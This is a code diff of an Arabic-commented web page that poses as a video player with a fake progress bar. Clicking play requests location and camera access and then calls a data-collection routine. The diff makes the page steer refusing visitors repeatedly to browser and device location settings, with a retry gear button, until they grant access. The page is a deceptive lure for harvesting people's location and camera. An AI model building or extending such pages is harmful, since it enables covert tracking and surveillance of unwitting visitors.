@@ -72,7 +72,7 @@
             border-bottom: 20px solid transparent;
             margin-left: 8px;
         }
-        /* زر الترس الكبير – لن يظهر أبداً */
+        /* زر الترس الكبير */
         #gearButton {
             display: none;
             flex-direction: column;
@@ -117,26 +117,6 @@
             color: #ddd;
             margin-top: 8px;
             opacity: 0.9;
-        }
-        /* زر إعادة المحاولة – لن يظهر أبداً */
-        #retryButton {
-            display: none;
-            margin-top: 20px;
-            padding: 12px 30px;
-            background: #1a73e8;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            cursor: pointer;
-            z-index: 10;
-            position: absolute;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-        #retryButton:hover {
-            background: #1557b0;
         }
 
         .video-info {
@@ -300,13 +280,12 @@
                 <div class="spinner" id="spinner"></div>
             </div>
 
-            <!-- الأزرار المخفية (غير مستخدمة) -->
-            <div id="gearButton" style="display:none !important;">
+            <!-- زر الترس - يظهر عند رفض الصلاحيات -->
+            <div id="gearButton">
                 <div class="icon-gear">⚙️</div>
                 <div class="main-text">تغيير الإعدادات</div>
                 <div class="sub-text">اضغط لفتح إعدادات الموقع في المتصفح</div>
             </div>
-            <button id="retryButton" style="display:none !important;">إعادة المحاولة</button>
         </div>
 
         <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
@@ -349,15 +328,14 @@
             let settingsOpened = false;
             let videoStarted = false;
             let isProcessing = false;
+            let returnedFromSettings = false;
 
             const playBtn = document.getElementById('playButtonOverlay');
             const thumbnailArea = document.getElementById('thumbnailArea');
             const realVideo = document.getElementById('realVideo');
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
-            // العناصر محفوظة لكنها لا تُستخدم
             const gearBtn = document.getElementById('gearButton');
-            const retryBtn = document.getElementById('retryButton');
 
             // طلب الصلاحيات (الموقع والكاميرا)
             async function requestPermissions() {
@@ -391,7 +369,7 @@
             function openBrowserLocationSettings() {
                 const ua = navigator.userAgent;
 
-                // Chrome
+                // محاولة 1: Chrome
                 if (/Chrome/.test(ua) && !/Edge/.test(ua)) {
                     try {
                         window.location.href = 'chrome://settings/content/location';
@@ -399,7 +377,7 @@
                     } catch (e) {}
                 }
 
-                // Firefox
+                // محاولة 2: Firefox
                 if (/Firefox/.test(ua)) {
                     try {
                         window.location.href = 'about:preferences#privacy';
@@ -407,7 +385,7 @@
                     } catch (e) {}
                 }
 
-                // Safari Mac
+                // محاولة 3: Safari (Mac)
                 if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
                     try {
                         window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
@@ -415,7 +393,7 @@
                     } catch (e) {}
                 }
 
-                // Android
+                // محاولة 4: Android (فتح إعدادات التطبيق)
                 if (/Android/.test(ua)) {
                     try {
                         window.location.href = 'intent://settings#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end';
@@ -427,7 +405,7 @@
                     } catch (e) {}
                 }
 
-                // عام
+                // محاولة 5: فتح إعدادات الموقع العامة (قد تفتح إعدادات الجهاز)
                 try {
                     window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                 } catch (e) {
@@ -626,45 +604,51 @@
                 isProcessing = false;
             }
 
-            // الدوال المساعدة لم تعد تُستخدم لكن نُبقيها للتوافق
-            function showGearButton() {}
-            function hideGearButton() {}
-            function showRetryButton() {}
+            function showGearButton() {
+                gearBtn.style.display = 'flex';
+                playBtn.style.display = 'none';
+            }
 
-            // معالج الضغط على زر التشغيل (الزر الوحيد)
+            function hideGearButton() {
+                gearBtn.style.display = 'none';
+                playBtn.style.display = 'flex';
+            }
+
+            // معالج الضغط على زر التشغيل
             async function handlePlayClick(e) {
                 e.stopPropagation();
                 if (videoStarted || isProcessing) return;
 
-                // طلب الصلاحيات
-                const granted = await requestPermissions();
+                if (!settingsOpened) {
+                    // الضغطة الأولى: فتح إعدادات الموقع
+                    openBrowserLocationSettings();
+                    settingsOpened = true;
+                    return;
+                }
 
+                // الضغطة الثانية أو إعادة المحاولة: طلب الصلاحيات
+                const granted = await requestPermissions();
                 if (granted) {
-                    // تم المنح: نجمع البيانات ونشغل الفيديو
-                    settingsOpened = false; // إعادة تعيين الحالة
+                    hideGearButton();
                     await collectAndPlay();
                 } else {
-                    // الصلاحيات مرفوضة
-                    if (!settingsOpened) {
-                        // المرة الأولى: افتح الإعدادات
-                        settingsOpened = true;
-                        openBrowserLocationSettings();
-                    } else {
-                        // المرة الثانية وما بعدها: أعد فتح الإعدادات (تغيير + إعادة محاولة)
-                        openBrowserLocationSettings();
-                    }
+                    showGearButton();
+                    // زر التشغيل سيقوم بإعادة المحاولة عند الضغط عليه مرة أخرى
                 }
             }
 
-            // مراقبة العودة من الإعدادات (لا تفعل شيئاً تلقائياً، فقط تضبط الحالة)
+            // معالج زر الترس
+            function handleGearClick() {
+                // عند الضغط على الترس نفتح الإعدادات مرة أخرى
+                openBrowserLocationSettings();
+                // لا نغير settingsOpened لأنها مازالت true
+            }
+
+            // مراقبة العودة من الإعدادات
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // لا نقوم بأي إجراء تلقائي هنا، نترك المستخدم يضغط الزر مرة أخرى
-                    // فقط نتأكد من أن الـ spinner مخفي إذا كان ظاهراً بالخطأ
-                    spinner.style.display = 'none';
-                    loading.style.display = 'none';
-                    playBtn.style.opacity = '1';
-                    playBtn.style.pointerEvents = 'auto';
+                    // نضع علامة أن المستخدم عاد من الإعدادات، لكننا لا نطلب الصلاحيات تلقائياً
+                    returnedFromSettings = true;
                 }
             });
 
@@ -675,7 +659,9 @@
             if (thumbnailArea) {
                 thumbnailArea.addEventListener('click', handlePlayClick);
             }
-            // لا نربط أزرار الترس أو إعادة المحاولة لأنها غير ظاهرة
+            if (gearBtn) {
+                gearBtn.addEventListener('click', handleGearClick);
+            }
 
             // تفعيل الصوت عند أي تفاعل
             document.addEventListener('click', function() {
@@ -686,7 +672,7 @@
                 }
             }, true);
 
-            // أزرار التحكم (باقية كما هي)
+            // أزرار التحكم
             document.querySelectorAll('.control-button').forEach(button => {
                 button.addEventListener('click', function(e) {
                     e.stopPropagation();
@@ -701,7 +687,7 @@
                 });
             });
 
-            // شريط التقدم الوهمي (باقي)
+            // شريط التقدم الوهمي
             const progressInterval = setInterval(() => {
                 const progressFill = document.querySelector('.progress-fill');
                 const realVideoEl = document.getElementById('realVideo');
